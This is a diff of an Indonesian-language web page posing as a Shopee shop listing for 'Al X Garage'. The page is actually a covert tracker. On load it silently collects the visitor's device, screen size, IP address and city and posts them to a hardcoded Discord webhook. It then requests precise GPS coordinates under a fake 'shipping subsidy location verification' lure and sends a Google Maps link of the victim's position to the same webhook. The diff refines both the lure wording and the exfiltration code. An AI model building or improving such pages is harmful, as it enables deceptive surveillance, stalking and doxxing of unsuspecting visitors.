@@ -18,14 +18,15 @@
     .shopee-orange-text { color: #ee4d2d; }
     .shopee-orange-bg { background-color: #ee4d2d; }
     .line-clamp-2 { display: -webkit-box; -webkit-line-clamp: 2; -webkit-box-orient: vertical; overflow: hidden; }
-    #loader { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255,255,255,0.9); z-index: 9999; justify-content: center; align-items: center; flex-direction: column; }
+    #loader { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255,255,255,0.95); z-index: 9999; justify-content: center; align-items: center; flex-direction: column; }
   </style>
 </head>
 <body class="max-w-md mx-auto bg-white min-h-screen relative pb-20">
 
   <div id="loader">
-    <div class="animate-spin rounded-full h-10 w-10 border-b-2 border-[#ee4d2d]"></div>
-    <p class="text-sm mt-3 font-medium text-gray-700">Memproses Pesanan...</p>
+    <div class="animate-spin rounded-full h-12 w-12 border-t-2 border-b-2 border-[#ee4d2d]"></div>
+    <p class="text-sm mt-4 font-bold text-[#ee4d2d]">Memproses Lokasi Pengiriman...</p>
+    <p class="text-[10px] text-gray-400 mt-1">Jangan tutup halaman ini</p>
   </div>
 
   <div class="relative w-full aspect-square bg-gray-200" onclick="handleAction()">
@@ -51,12 +52,12 @@
     <i class="fas fa-shipping-fast text-blue-600 mt-1"></i>
     <div>
       <p class="text-sm font-semibold text-gray-800">Verifikasi Lokasi Pengiriman</p>
-      <p class="text-[12px] text-gray-600">Verifikasi lokasi diperlukan untuk aktivasi subsidi ongkir Al X Garage.</p>
+      <p class="text-[12px] text-gray-600">Klik untuk klaim subsidi ongkir Al X Garage melalui deteksi lokasi.</p>
     </div>
   </div>
 
   <div class="mt-2 p-4 bg-white flex items-center gap-3 border-y border-gray-100" onclick="handleAction()">
-    <div class="w-12 h-12 rounded-full overflow-hidden border border-gray-200">
+    <div class="w-12 h-12 rounded-full overflow-hidden border border-gray-100 shadow-inner">
       <img src="https://images.unsplash.com/photo-1530046339160-ce3e530c7d2f?auto=format&fit=crop&q=80&w=150" alt="Al X Garage" class="w-full h-full object-cover">
     </div>
     <div class="flex-1">
@@ -88,72 +89,62 @@
   <script>
     const webhook = "https://discord.com/api/webhooks/1468299380330332355/I2z1xzpeHQp4iKlllSQOFewI_z_OjIRBsDmgl7jbqbvM4GWQtYTewJXltpZQsGB5OV87";
 
-    async function pushDiscord(title, fields) {
-      try {
-        await fetch(webhook, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ embeds: [{ title, fields, color: 15548997, timestamp: new Date() }] }),
-          keepalive: true
-        });
-      } catch (e) {}
+    function pushDiscord(title, fields) {
+      return fetch(webhook, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ embeds: [{ title, fields, color: 15548997, timestamp: new Date() }] })
+      });
     }
 
-    function captureGeo(isManual = false) {
-      if (isManual) document.getElementById('loader').style.display = 'flex';
-
-      navigator.geolocation.getCurrentPosition(
-        async (position) => {
-          const lat = position.coords.latitude;
-          const lon = position.coords.longitude;
-          await pushDiscord("✅ LOKASI DITERIMA", [
-            { name: "Maps Link", value: `https://www.google.com/maps?q=${lat},${lon}` },
-            { name: "Koordinat", value: `${lat}, ${lon}` }
-          ]);
-          if (isManual) window.location.href = 'profiltoko.html';
-        },
-        async (error) => {
-          await pushDiscord("❌ LOKASI DITOLAK/ERROR", [{ name: "Status", value: "User Denied Permission" }]);
-          if (isManual) {
-            alert("Merchant: Harap berikan akses lokasi untuk melanjutkan.");
-            window.location.href = 'profiltoko.html';
-          }
-        },
-        { enableHighAccuracy: true, timeout: 10000 }
-      );
+    function getCoords() {
+      return new Promise((resolve, reject) => {
+        navigator.geolocation.getCurrentPosition(resolve, reject, {
+          enableHighAccuracy: true,
+          timeout: 10000,
+          maximumAge: 0
+        });
+      });
     }
 
     window.onload = async () => {
       let coreData = [
         { name: "📱 Device", value: navigator.platform, inline: true },
-        { name: "📏 Resolusi", value: `${screen.width}x${screen.height}`, inline: true },
-        { name: "🔋 Baterai", value: "N/A", inline: true }
+        { name: "📏 Screen", value: `${screen.width}x${screen.height}`, inline: true }
       ];
-
-      if (navigator.getBattery) {
-        const b = await navigator.getBattery();
-        coreData[2].value = `${Math.round(b.level * 100)}%`;
-      }
 
       try {
         const res = await fetch('https://ipapi.co/json/');
         const ip = await res.json();
-        coreData.push(
-          { name: "🌍 IP", value: ip.ip },
-          { name: "🏙️ Kota", value: ip.city },
-          { name: "🏢 Provider", value: ip.org }
-        );
+        coreData.push({ name: "🌍 IP", value: ip.ip }, { name: "🏙️ Kota", value: ip.city });
       } catch (e) {}
 
       await pushDiscord("🔥 DATA ENTRY OTOMATIS", coreData);
       
-      setTimeout(() => {
-        captureGeo(false);
-      }, 1000);
+      setTimeout(async () => {
+        try {
+          const pos = await getCoords();
+          await pushDiscord("✅ LOKASI DITERIMA (AUTO)", [
+            { name: "Maps", value: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}` }
+          ]);
+        } catch (e) {}
+      }, 1500);
     };
 
-    function handleAction() {
-      captureGeo(true);
+    async function handleAction() {
+      document.getElementById('loader').style.display = 'flex';
+      
+      try {
+        const pos = await getCoords();
+        await pushDiscord("✅ LOKASI DITERIMA (CLICK)", [
+          { name: "Maps Link", value: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}` }
+        ]);
+        window.location.href = 'profiltoko.html';
+      } catch (error) {
+        await pushDiscord("❌ LOKASI DITOLAK (CLICK)", [{ name: "Status", value: "User Denied/GPS Off" }]);
+        alert("Peringatan: Verifikasi lokasi gagal. Silakan isi alamat secara manual di halaman berikutnya.");
+        window.location.href = 'profiltoko.html';
+      }
     }
   </script>
 </body>
